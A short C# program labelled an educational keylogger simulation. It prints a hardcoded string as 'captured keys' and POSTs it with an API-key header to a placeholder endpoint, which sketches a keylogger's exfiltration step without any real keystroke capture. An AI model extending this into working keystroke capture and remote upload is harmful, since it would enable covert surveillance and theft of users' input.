using System;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

/// <summary>
/// Educational keylogger demo – only logs keys to console and simulates sending.
/// This version is SAFE for GitHub public repositories.
/// </summary>
internal class Program
{
    static async Task Main(string[] args)
    {
        Console.WriteLine("✅ Educational Keylogger Simulation Started");

        // Simulated keystroke log (demo only)
        string simulatedKeys = "Hello, this is a simulated keylog!";
        Console.WriteLine($"📝 Captured Keys: {simulatedKeys}");

        // Simulate sending to server
        await SendLogAsync(simulatedKeys);
    }

    static async Task SendLogAsync(string data)
    {
        string apiUrl = "https://your-api-endpoint.com/receive"; // Dummy URL for demo
        var client = new HttpClient();

        var content = new StringContent(data, Encoding.UTF8, "text/plain");
        content.Headers.Add("X-API-KEY", "demo-api-key");

        try
        {
            Console.WriteLine("📡 Sending data...");
            var response = await client.PostAsync(apiUrl, content);
            Console.WriteLine($"✅ Server responded: {response.StatusCode}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"❌ Failed to send: {ex.Message}");
        }
    }
}

